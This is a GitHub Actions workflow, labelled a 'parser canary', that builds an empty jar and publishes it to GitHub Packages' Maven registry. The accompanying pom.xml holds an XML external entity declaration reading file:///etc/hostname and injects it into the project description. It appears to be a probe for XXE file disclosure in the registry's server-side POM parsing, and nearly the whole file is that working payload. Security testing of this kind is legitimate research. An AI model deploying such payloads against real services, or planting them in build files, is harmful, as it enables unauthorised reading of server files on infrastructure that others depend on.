name: G10 Maven parser canary\non:\n  push:\n    paths:\n      - .github/workflows/g10-maven-parser.yml\npermissions:\n  contents: read\n  packages: write\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-java@v4\n        with:\n          distribution: temurin\n          java-version: "17"\n          server-id: github\n          server-username: GITHUB_ACTOR\n          server-password: GITHUB_TOKEN\n      - name: Build and publish parser canary\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: |\n          set -eux\n          mkdir -p /tmp/g10m/empty\n          jar cf /tmp/g10m/g10-parser-30853164675.jar -C /tmp/g10m/empty .\n          cat > /tmp/g10m/pom.xml <<EOF\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE project [\n  <!ENTITY g10 SYSTEM "file:///etc/hostname">\n]>\n<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">\n  <modelVersion>4.0.0</modelVersion>\n  <groupId>com.apexblack.g10</groupId>\n  <artifactId>g10-parser-30853164675</artifactId>\n  <version>1.0.0</version>\n  <packaging>jar</packaging>\n  <description>&g10;</description>\n</project>\nEOF\n          mvn -B deploy:deploy-file -Dfile=/tmp/g10m/g10-parser-30853164675.jar -DpomFile=/tmp/g10m/pom.xml -DrepositoryId=github -Durl=https://maven.pkg.github.com/apexblack-koala-274804/chainship-test-release
